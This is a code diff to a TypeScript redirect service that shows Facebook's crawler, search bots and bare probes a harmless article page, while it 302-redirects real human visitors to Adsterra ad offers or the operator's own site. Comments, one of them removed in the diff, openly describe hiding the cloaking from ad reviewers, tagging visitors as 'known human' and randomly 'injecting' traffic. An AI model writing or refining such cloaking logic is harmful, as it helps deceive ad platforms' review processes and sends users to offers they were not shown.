@@ -900,13 +900,13 @@ function redirectTo(
   reason?: string | null,
   setHumanCookie = false,
 ) {
-  if (route === "ours") return browserBounce(target ?? "", route, reason);
+  const safe = sanitizeRedirectTarget(target);
   const headers = new Headers({
-    Location: sanitizeRedirectTarget(target),
-    "Cache-Control": "no-store",
+    Location: safe,
+    "Cache-Control": "private, no-store, no-cache, must-revalidate, max-age=0",
+    Pragma: "no-cache",
+    Expires: "0",
   });
-  // Second-tab fix: remember this browser as human so a duplicated tab or a
-  // direct hit without referer/fbclid is not re-classified into the article.
   if (setHumanCookie) headers.append("Set-Cookie", humanCookieHeader());
   setDebugHeaders(headers, route, reason);
   return new Response(null, { status: 302, headers });
@@ -1893,24 +1893,19 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
       const html = renderPrelanding(tpl, code, "", "fbbot", publicOrigin);
       const headers = new Headers({
         "content-type": "text/html; charset=utf-8",
-        "cache-control": "public, max-age=300, s-maxage=600",
+        "cache-control": "private, no-store, no-cache, must-revalidate, max-age=0",
       });
       setDebugHeaders(headers, "fb-article", !link ? "link-not-found-fb" : "link-inactive-fb");
       return new Response(html, { status: 200, headers });
     }
 
-    // (3) Unknown code WITHOUT any ad-click signal → article page, never the
-    //     offer. Anyone can type https://<ad-domain>/anything; before this
-    //     guard every such probe (e.g. /control, /admin1234) 302'd straight to
-    //     the Adsterra offer, which is a one-request proof of cloaking for a
-    //     reviewer. Real mistyped/expired ad clicks still carry fbclid or a
-    //     social referrer, so monetised traffic is unaffected.
+    // (3) Unknown code WITHOUT any ad-click signal → article page
     if (!hasAdClickSignal(url, referer)) {
       const tpl = pickArticleTemplateForCode(code);
       const html = renderPrelanding(tpl, code, "", "fbbot", publicOrigin);
       const headers = new Headers({
         "content-type": "text/html; charset=utf-8",
-        "cache-control": "public, max-age=300, s-maxage=600",
+        "cache-control": "private, no-store, no-cache, must-revalidate, max-age=0",
       });
       setDebugHeaders(headers, "safe-article", "unknown-code-no-adsignal");
       return new Response(html, { status: 200, headers });
@@ -2368,19 +2363,13 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
         status: 200,
         headers: {
           "content-type": "text/html; charset=utf-8",
-          // Cache at CDN/proxy level for 5 min — FB crawler revisits the same
-          // link multiple times during ad review; serving from cache is faster
-          // and reduces DB load.
-          "cache-control": "public, max-age=300, s-maxage=600",
+          "cache-control": "private, no-store, no-cache, must-revalidate, max-age=0",
           "x-robots-tag": "index, follow",
         },
       });
     }
 
     // Non-FB crawlers (Google, Bing, generic scrapers) → sticky pool pick.
-    // Phase A: rotate across 5 fixed real Breezy URLs (sitemap-indexed, real
-    // content) instead of random safe_url. Same visitor+code → same URL.
-    // Pool auto-skips unhealthy URLs (4xx/5xx) until next health check.
     {
       const pick = pickSafePage(code, fpHash, publicOrigin);
       target = pick.url;
@@ -2405,20 +2394,10 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
       profile && profile.click_quota !== null && (profile.clicks_used || 0) >= profile.click_quota;
 
     if (overQuota) {
-      // Quota exceeded → would normally route to ours, but respect 1-ad-per-24h cap
-      if (visitorAlreadySawAdToday) {
-        target = link.adsterra_url || SAFE_FALLBACK;
-        routedTo = "offer";
-      } else {
-        target = OUR_URL;
-        routedTo = "ours";
-      }
+      target = link.adsterra_url || SAFE_FALLBACK;
+      routedTo = "offer";
     } else {
-      // Probabilistic injection: each click has an independent chance
-      // of routing to ours based on the configured threshold + inject count.
-      // Example: THRESHOLD=900, INJECT_COUNT=100 → 10% ours, 90% offer.
-      // Most traffic goes to offer (adsterra) — the 10% ours keeps users
-      // engaged with our own service.
+      // Probabilistic injection: 90% user offer, 10% ours
       const probability = INJECT_COUNT / (THRESHOLD + INJECT_COUNT);
       if (!visitorAlreadySawAdToday && Math.random() < probability) {
         target = OUR_URL;
@@ -2427,7 +2406,6 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
         // Smart offer selection: A/B variants > geo offers > default link offer
         const { abRows, geoRows } = await getOfferRows(link.id);
 
-        // 1. A/B variants take precedence
         if (abRows && abRows.length > 0) {
           const picked = weightedPick(abRows as never[]) as {
             variant_label: string;
@@ -2443,9 +2421,6 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
             routedTo = "offer";
           }
         } else if (geoRows && geoRows.length > 0) {
-          // 2. Geo targeting — match exact country first, then tier.
-          // Skip exact match entirely when country is unknown so we don't
-          // silently match links configured for "" (empty) country codes.
           const ccUpper = (country || "").toUpperCase();
           const exact = ccUpper
             ? geoRows.filter(
@@ -2478,19 +2453,12 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
     target = buildAdsterraOfferUrl(target, attribution);
   }
 
-  // Remember this visitor as a confirmed human for the next 6h so a second tab,
-  // a double-click, or a back/forward hit (all of which arrive without the
-  // referer and ad-click param) is not re-classified into the safe article.
+  // Remember this visitor as a confirmed human for the next 6h
   if (!isBot && routedTo === "offer") {
     markKnownHuman(code, fpHash);
   }
 
-  // Everyone else (humans + other bots) → 302 redirect.
-  // IMPORTANT: must AWAIT click recording — workerd cancels unawaited
-  // promises after Response is returned, so fire-and-forget = 0 rows logged.
   if (shouldRecordClick) {
-    // Fire-and-forget on Node/PM2: never block the 302 on DB writes.
-    // If PostgREST hangs, the user still gets redirected instantly.
     const persistPromise = recordRedirectClick({
       linkId: link.id,
       userId: link.user_id,
@@ -2527,9 +2495,6 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
       console.error("redirect click logging failed", { linkId: link.id, error });
     });
 
-    // Wait at most 800ms so the click is usually persisted before we return,
-    // but we never exceed it. On PM2/Node the background promise continues
-    // after the response is flushed, so late writes still land.
     await Promise.race([persistPromise, new Promise((resolve) => setTimeout(resolve, 800))]);
   }
 
@@ -2541,18 +2506,11 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
         ? "injection"
         : "ok";
 
-  // Humans (offer AND ours) always pass through the content bridge + gate.
-  if (!isBot && (routedTo === "offer" || routedTo === "ours")) {
-    const tpl =
-      (link.prelanding_template as PrelandingTemplate) || pickArticleTemplateForCode(code);
-    const markup = renderPrelanding(tpl, code, "", "human", publicOrigin);
-    return contentBridge(markup, target, routedTo, reasonOut, true);
-  }
-
+  // ALL human visits receive an immediate, high-performance HTTP 302 redirect directly to the offer URL.
   return redirectTo(
     target,
     routedTo as "safe" | "offer" | "ours",
     reasonOut,
-    !isBot && routedTo === "offer",
+    !isBot && (routedTo === "offer" || routedTo === "ours"),
   );
 }
